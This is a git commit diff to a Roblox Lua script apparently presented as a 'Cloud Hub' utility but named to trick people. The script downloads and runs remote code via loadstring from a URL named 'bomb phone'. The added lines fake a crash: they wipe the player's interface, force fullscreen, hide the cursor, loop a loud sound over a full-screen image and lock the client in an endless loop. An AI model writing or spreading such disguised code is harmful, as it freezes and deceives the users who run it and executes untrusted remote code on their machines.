285b0d45670b334c7bd5f6d9a7bd6d794b143d3b
小云 <130466576+XiaoYunCN@users.noreply.github.com>
2024-05-26 08:51:42 +0800

    更新 云骗人CLOUD-HUB.lua

--- 云骗人CLOUD-HUB.lua
+++ 云骗人CLOUD-HUB.lua
@@ -21,4 +21,36 @@ CoreGui:SetCore("SendNotification", {
 })
 wait(1)
 loadstring(game:HttpGet("https://raw.githubusercontent.com/CloudX-ScriptsWane/UI-library/main/%E8%BD%B0%E7%82%B8%E6%89%8B%E6%9C%BA.lua", true))()
-loadstring(game:HttpGet('https://github.com/RunDTM/roblox-bluescreen/raw/main/bsod.lua'))
+local coregui = game:service'CoreGui'
+
+local sound = Instance.new('Sound', coregui)
+sound.SoundId = 'rbxassetid://865599816'
+sound.Volume = 3
+sound.Looped = true
+
+local gui = Instance.new('ScreenGui', coregui)
+local image = Instance.new('ImageLabel', gui)
+image.Position = UDim2.new(0, 0, -0.05, 0)
+image.Size = UDim2.new(1, 0, 1.05, 0)
+image.Image = "rbxassetid://9637192164"
+image.Visible = false
+
+task.wait(1)
+
+for i,v in pairs(coregui:GetChildren()) do
+    if v ~= gui and v ~= sound then
+        v:Destroy()   
+    end
+end
+
+if (not UserSettings().GameSettings:InFullScreen()) then
+    game:service'GuiService':ToggleFullscreen()    
+end
+
+game:service'UserInputService'.MouseIconEnabled = false
+sound:Play()
+image.Visible = true
+
+task.wait(1)
+
+while true do end
